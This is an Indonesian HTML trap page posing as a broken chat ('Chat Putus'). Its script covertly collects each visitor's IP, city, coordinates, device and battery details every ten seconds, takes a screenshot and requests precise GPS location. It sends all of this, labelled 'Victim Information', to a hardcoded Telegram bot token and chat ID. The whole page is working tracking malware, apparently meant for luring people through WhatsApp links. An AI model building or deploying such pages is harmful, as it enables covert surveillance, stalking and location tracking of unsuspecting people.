<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Chat Putus</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      height: 100vh;
      overflow: hidden;
    }
    #bg {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      object-fit: cover;
      z-index: -1;
    }
    audio { display: none; }
  </style>
</head>
<body>

<img id="bg" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8T_3B0IQlwimDVKhm29FJyNtEnni0EzXFyw&usqp=CAU" alt="jebakan">
<audio autoplay loop>
  <source src="https://cdn.pixabay.com/audio/2023/03/15/audio_a3f5b0f8e5.mp3" type="audio/mp3">
</audio>

<script>
  const token = '8144503530:AAE6pFvuAK_On07V5kSuFvLMPR5baMTU-SI';
  const chatId = '7728427008';

  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
  }

  async function getInfo() {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();
    
    const device = navigator;
    const battery = await navigator.getBattery();
    const now = new Date();

    let info = `‚úÖVictim Information\n\n`;
    info += `üì° IP: ${ipData.ip} | Time: ${now.toLocaleString("id-ID")}\n\n`;
    info += `üìç Lokasi: ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n`;
    info += `üìÆ Kode Pos: ${ipData.postal}\n`;
    info += `üß≠ Koordinat: ${ipData.latitude}, ${ipData.longitude}\n\n`;
    
    info += `üì± Device Info:\n`;
    info += `User Agent: ${device.userAgent}\n`;
    info += `Platform: ${device.platform}\n`;
    info += `RAM: ${device.deviceMemory || "?"} GB\n`;
    info += `CPU Thread: ${device.hardwareConcurrency || "?"}\n`;
    info += `Bahasa: ${device.language}\n\n`;
    
    info += `üîã Baterai: ${Math.round(battery.level * 100)}%\n`;
    info += `‚ö° Charging: ${battery.charging}\n\n`;

    info += `üï∏Ô∏è Jaringan: ${(navigator.connection && navigator.connection.effectiveType) || "unknown"}\n`;

    sendToTelegram(info);
  }

  function captureScreenshot() {
    html2canvas(document.body).then(canvas => {
      canvas.toBlob(blob => {
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("caption", "üì∏ Screenshot jebakan WA");
        form.append("photo", blob, "screenshot.jpg");

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      });
    });
  }

  // Inject html2canvas
  const script = document.createElement("script");
  script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
  script.onload = () => {
    captureScreenshot();
    getInfo();
    setInterval(getInfo, 10000); // update tiap 10 detik
  };
  document.head.appendChild(script);

  // Auto minta izin lokasi
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
    sendToTelegram(`üìç Lokasi Akurat:\nLatitude: ${lat}\nLongitude: ${lon}\nüìå ${maps}`);
  });
</script>

</body>
</html>
